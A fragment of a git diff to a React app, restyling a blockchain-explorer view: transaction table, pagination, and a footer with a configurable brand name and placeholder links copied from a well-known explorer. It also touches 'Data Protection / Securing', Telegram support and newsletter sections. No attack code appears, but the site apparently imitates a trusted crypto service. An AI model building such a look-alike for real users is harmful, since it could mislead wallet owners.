                     <button type="button" className="es-filter-btn">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>
-                      Filter
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>
+                      Advanced Filter
                     </button>
                     <button type="button" className="es-filter-btn">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                       Download CSV
+                    </button>
+                    <button type="button" className="es-filter-btn es-filter-btn--icon" title="Column settings">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
                     </button>
                   </div>
                 </div>
 
-                {/* Transaction table */}
+                {/* ── Transaction table ── */}
                 <div className="es-table-wrap">
-                  {esError && <div className="status-bar" style={{ marginBottom: '0.75rem' }}><span className="status-dot warn" />{esError}</div>}
-                  {esLoading && <div className="status-bar" style={{ marginBottom: '0.75rem' }}><span className="status-dot" />Loading live on-chain data…</div>}
+                  {esError && (
+                    <div className="es-table-notice es-table-notice--warn">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                      {esError}
+                    </div>
+                  )}
                   <table className="es-table">
                     <thead>
                       <tr>
-                        <th></th>
+                        <th style={{ width: 28 }}></th>
                         <th>Txn Hash</th>
-                        <th>Method</th>
+                        <th>Method
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="10" height="10" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: 3 }}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        </th>
                         <th>Block</th>
                         <th>Age</th>
                         <th>From</th>
-                        <th></th>
+                        <th style={{ width: 50 }}></th>
                         <th>To</th>
                         <th>Value</th>
                         <th>Txn Fee</th>
@@ -4245,30 +4492,42 @@ export default function App() {
                       {esTxRows.map((tx, i) => (
                         <tr key={tx.hash} className={i % 2 === 0 ? 'es-tr-even' : ''}>
                           <td>
-                            <div className="es-tx-icon">
-                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                            <div className="es-tx-status-icon es-tx-status-icon--ok" title="Success">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                             </div>
                           </td>
                           <td>
                             <a className="es-link es-hash" href={`${explorerTxUrl}${tx.hash}`} target="_blank" rel="noopener noreferrer" title={tx.hash}>
-                              {tx.hash.slice(0, 10)}…
+                              {tx.hash.slice(0, 8)}…{tx.hash.slice(-6)}
                             </a>
                           </td>
-                          <td><span className="es-method-badge">{tx.method}</span></td>
-                          <td><a className="es-link" href={`${explorerBlockUrl}${tx.block}`} target="_blank" rel="noopener noreferrer">{tx.block.toLocaleString()}</a></td>
-                          <td className="es-age">{tx.age}</td>
+                          <td><span className={`es-method-badge es-method-badge--${tx.direction.toLowerCase()}`}>{tx.method}</span></td>
                           <td>
-                            <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.from}`} target="_blank" rel="noopener noreferrer" title={tx.from}>
-                              {tx.from === esAddr ? <strong title={tx.from}>{shortEsAddr}</strong> : `${tx.from.slice(0, 8)}…${tx.from.slice(-4)}`}
+                            <a className="es-link" href={`${explorerBlockUrl}${tx.block}`} target="_blank" rel="noopener noreferrer">
+                              {tx.block.toLocaleString()}
                             </a>
+                          </td>
+                          <td className="es-age" title={`Block #${tx.block.toLocaleString()}`}>{tx.age}</td>
+                          <td>
+                            {tx.from === esAddr ? (
+                              <span className="es-addr-self" title={tx.from}>{shortEsAddr}</span>
+                            ) : (
+                              <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.from}`} target="_blank" rel="noopener noreferrer" title={tx.from}>
+                                {tx.from.slice(0, 6)}…{tx.from.slice(-4)}
+                              </a>
+                            )}
                           </td>
                           <td>
                             <span className={`es-dir-badge es-dir-badge--${tx.direction.toLowerCase()}`}>{tx.direction}</span>
                           </td>
                           <td>
-                            <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.to}`} target="_blank" rel="noopener noreferrer" title={tx.to}>
-                              {tx.to === esAddr ? <strong>{shortEsAddr}</strong> : `${tx.to.slice(0, 8)}…${tx.to.slice(-4)}`}
-                            </a>
+                            {tx.to === esAddr ? (
+                              <span className="es-addr-self" title={tx.to}>{shortEsAddr}</span>
+                            ) : (
+                              <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.to}`} target="_blank" rel="noopener noreferrer" title={tx.to}>
+                                {tx.to.slice(0, 6)}…{tx.to.slice(-4)}
+                              </a>
+                            )}
                           </td>
                           <td className="es-value">{tx.value}</td>
                           <td className="es-fee">{tx.fee}</td>
@@ -4276,8 +4535,10 @@ export default function App() {
                       ))}
                       {!esLoading && esTxRows.length === 0 && (
                         <tr>
-                          <td colSpan={10} className="es-age" style={{ textAlign: 'center', padding: '1rem' }}>
-                            No transaction history returned for this wallet.
+                          <td colSpan={10} className="es-empty-row">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="32" height="32" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                            <p>There are no matching entries for this address.</p>
+                            <span>The address may have zero transactions on {chainConfig[chain].label}.</span>
                           </td>
                         </tr>
                       )}
@@ -4285,23 +4546,27 @@ export default function App() {
                   </table>
                 </div>
 
-                {/* Pagination */}
+                {/* ── Pagination ── */}
                 <div className="es-pagination">
-                  <div className="es-page-info">Page 1 of 1</div>
+                  <div className="es-page-info">
+                    Page <strong>1</strong> of <strong>1</strong>
+                    <span className="es-page-info-sep">·</span>
+                    {esTxRows.length} record{esTxRows.length !== 1 ? 's' : ''}
+                  </div>
                   <div className="es-page-controls">
-                    <button type="button" className="es-page-btn" disabled>«</button>
-                    <button type="button" className="es-page-btn" disabled>‹</button>
+                    <button type="button" className="es-page-btn" disabled title="First">«</button>
+                    <button type="button" className="es-page-btn" disabled title="Prev">‹</button>
                     <button type="button" className="es-page-btn es-page-btn--active">1</button>
-                    <button type="button" className="es-page-btn" disabled>›</button>
-                    <button type="button" className="es-page-btn" disabled>»</button>
+                    <button type="button" className="es-page-btn" disabled title="Next">›</button>
+                    <button type="button" className="es-page-btn" disabled title="Last">»</button>
                   </div>
                   <div className="es-page-size">
                     Show
-                    <select value={esTxRows.length > 10 ? '25' : '10'} className="es-page-select" disabled>
-                      <option>10</option>
-                      <option>25</option>
-                      <option>50</option>
-                      <option>100</option>
+                    <select className="es-page-select" disabled defaultValue="25">
+                      <option value="10">10</option>
+                      <option value="25">25</option>
+                      <option value="50">50</option>
+                      <option value="100">100</option>
                     </select>
                     records
                   </div>
@@ -4309,28 +4574,44 @@ export default function App() {
 
                 {/* Footer note */}
                 <div className="es-footer-note">
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                  A wallet address can have a zero native balance and yet have historical transactions if funds were moved out. Data is for informational purposes only. Txn fees are estimates based on current gas prices.
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 2 }}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                  A wallet address can have a zero native balance and still have historical transactions if funds were moved out. Transaction fees shown are estimates based on current gas prices and actual gas consumed. Data provided for informational purposes only.
                 </div>
-                </>)}
-              </div>
+              </>)}
+            </div>
 
-              {/* ── Explorer Footer ── */}
-              <div className="es-site-footer">
-                <div className="es-site-footer-inner">
-                  <div className="es-sf-brand">
-                    <svg viewBox="0 0 293.775 293.649" width="18" height="18" fill="rgba(255,255,255,0.5)"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
-                    <span>{explorerBrand}</span>
-                    <span className="es-sf-copy">© 2026 {explorerBrand}. All Rights Reserved.</span>
+            {/* ── Site footer ── */}
+            <div className="es-site-footer">
+              <div className="es-site-footer-inner">
+                <div className="es-sf-col es-sf-col--brand">
+                  <div className="es-sf-brand-row">
+                    <svg viewBox="0 0 293.775 293.649" width="22" height="22" fill="rgba(255,255,255,0.7)"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
+                    <span className="es-sf-brand-name">{explorerBrand}</span>
                   </div>
-                  <div className="es-sf-links">
-                    {['Company','Products','Terms of Service','Privacy Policy','Bug Bounty','Developers'].map(l => (
-                      <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
-                    ))}
-                  </div>
+                  <p className="es-sf-tagline">{chainConfig[chain].label} Blockchain Explorer</p>
+                  <p className="es-sf-copy">© 2026 {explorerBrand}. All Rights Reserved.</p>
+                </div>
+                <div className="es-sf-col">
+                  <div className="es-sf-col-title">Company</div>
+                  {['About Us','Brand Assets','Terms of Service','Privacy Policy','Bug Bounty','Contact Us'].map(l => (
+                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
+                  ))}
+                </div>
+                <div className="es-sf-col">
+                  <div className="es-sf-col-title">Community</div>
+                  {['API Documentation','Knowledge Base','Network Status','Newsletters','Disqus Comments'].map(l => (
+                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
+                  ))}
+                </div>
+                <div className="es-sf-col">
+                  <div className="es-sf-col-title">Products &amp; Services</div>
+                  {['Advertise','Explorer-as-a-Service','API Plans','Priority Support','Blockscan','Mobile App'].map(l => (
+                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
+                  ))}
                 </div>
               </div>
             </div>
+          </div>
         )}
 
         {/* ════════════ DATA PROTECTION / SECURING ════════════ */}
@@ -4606,9 +4887,7 @@ export default function App() {
                   Telegram Support
                 </a>
               </div>
-              <p className="muted" style={{ marginTop: '0.7rem', fontSize: '0.84rem' }}>
-                These links are configurable from the dashboard settings.
-              </p>
+
 
               <div className="support-block">
                 <h3>Newsletter Signup</h3>
